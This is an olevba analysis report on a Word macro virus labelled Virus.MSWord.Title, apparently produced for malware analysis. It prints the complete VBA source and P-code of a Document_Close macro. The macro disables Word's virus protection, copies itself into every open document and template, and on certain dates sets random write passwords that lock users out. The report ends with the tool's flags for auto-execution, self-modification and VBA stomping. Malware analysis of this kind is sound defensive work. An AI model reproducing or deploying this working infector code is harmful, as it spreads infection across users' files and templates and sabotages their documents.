olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Title
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Title - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
    If Left(Me.BuiltInDocumentProperties("Title"), 1) = "?" Then
        Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
        Exit Sub
    End If
    Me.BuiltInDocumentProperties("Title") = "?" & Me.BuiltInDocumentProperties("Title")
    Dim currdoc As Document
    Dim thecode As Object
    Dim currcomp As Object
    Set thecode = Me.VBProject.VBComponents.Item(Me.CodeName).CodeModule
    Dim lines As Integer, mystart As Integer
    mystart = thecode.ProcBodyLine("Document_Close", vbext_pk_Proc)
    mylines = thecode.ProcCountLines("Document_Close", vbext_pk_Proc) - mystart + 1
    Dim savy As Boolean
    Options.VirusProtection = False
    For Each currdoc In Documents
        savy = currdoc.Saved
        If currdoc.SaveFormat = wdFormatDocument Or currdoc.SaveFormat = wdFormatTemplate Then
            Set currcomp = currdoc.VBProject.VBComponents.Item(1)
            If Not currcomp.CodeModule.Find("wsxzaqedc", 1, 1, 100000, 100000) Then
                If Not currcomp.CodeModule.Find("Document_Close", 1, 1, 100000, 100000) Then
                    currcomp.CodeModule.AddFromString thecode.lines(mystart, mylines)
                Else
                    currcomp.CodeModule.InsertLines currcomp.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc) + 1, thecode.lines(mystart + 1, mylines - 2)
                End If
                If savy Then currdoc.Save
            End If
            If (Day(Now()) = 30 And Month(Now()) = 7) Or (Day(Now()) = 20 And Month(Now()) = 6) Or (Day(Now()) = 3 And Month(Now()) = 5) Then
                currdoc.WritePassword = Str(Int(Rnd() * 10) - 1)
                If savy Then currdoc.Save
            End If

        End If
    Next currdoc
    Dim currtemp As Template
    Dim code As String
    For Each currtemp In Templates
        savy = currtemp.Saved
        Set currcomp = currtemp.VBProject.VBComponents.Item(1)
        If Not currcomp.CodeModule.Find("wsxzaqedc", 1, 1, 100000, 100000) Then
            If Not currcomp.CodeModule.Find("Document_Close", 1, 1, 100000, 100000) Then
                code = thecode.lines(mystart, mylines)
                currcomp.CodeModule.AddFromString code
            Else
                code = thecode.lines(mystart + 1, mylines - 2)
                currcomp.CodeModule.InsertLines currcomp.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc) + 1, code
            End If
            If savy Then currtemp.Save
         End If
    Next currtemp
    Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Title
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4261 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "?"
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #4:
' 	ExitSub 
' Line #5:
' 	EndIfBlock 
' Line #6:
' 	LitStr 0x0001 "?"
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #7:
' 	Dim 
' 	VarDefn currdoc (As Document)
' Line #8:
' 	Dim 
' 	VarDefn thecode (As Object)
' Line #9:
' 	Dim 
' 	VarDefn currcomp (As Object)
' Line #10:
' 	SetStmt 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set thecode 
' Line #11:
' 	Dim 
' 	VarDefn lines (As Integer)
' 	VarDefn mystart (As Integer)
' Line #12:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld thecode 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St mystart 
' Line #13:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld thecode 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	Ld mystart 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	St mylines 
' Line #14:
' 	Dim 
' 	VarDefn savy (As Boolean)
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' 	StartForVariable 
' 	Ld currdoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #17:
' 	Ld currdoc 
' 	MemLd Saved 
' 	St savy 
' Line #18:
' 	Ld currdoc 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld currdoc 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld currdoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set currcomp 
' Line #20:
' 	LitStr 0x0009 "wsxzaqedc"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #21:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #22:
' 	Ld mystart 
' 	Ld mylines 
' 	Ld thecode 
' 	ArgsMemLd lines 0x0002 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld mystart 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld mylines 
' 	LitDI2 0x0002 
' 	Sub 
' 	Ld thecode 
' 	ArgsMemLd lines 0x0002 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld savy 
' 	If 
' 	BoSImplicit 
' 	Ld currdoc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #29:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Str 0x0001 
' 	Ld currdoc 
' 	MemSt WritePassword 
' Line #30:
' 	Ld savy 
' 	If 
' 	BoSImplicit 
' 	Ld currdoc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #31:
' 	EndIfBlock 
' Line #32:
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Ld currdoc 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	Dim 
' 	VarDefn currtemp (As Template)
' Line #36:
' 	Dim 
' 	VarDefn code (As String)
' Line #37:
' 	StartForVariable 
' 	Ld currtemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #38:
' 	Ld currtemp 
' 	MemLd Saved 
' 	St savy 
' Line #39:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld currtemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set currcomp 
' Line #40:
' 	LitStr 0x0009 "wsxzaqedc"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #41:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #42:
' 	Ld mystart 
' 	Ld mylines 
' 	Ld thecode 
' 	ArgsMemLd lines 0x0002 
' 	St code 
' Line #43:
' 	Ld code 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	ElseBlock 
' Line #45:
' 	Ld mystart 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld mylines 
' 	LitDI2 0x0002 
' 	Sub 
' 	Ld thecode 
' 	ArgsMemLd lines 0x0002 
' 	St code 
' Line #46:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld code 
' 	Ld currcomp 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld savy 
' 	If 
' 	BoSImplicit 
' 	Ld currtemp 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Ld currtemp 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #52:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

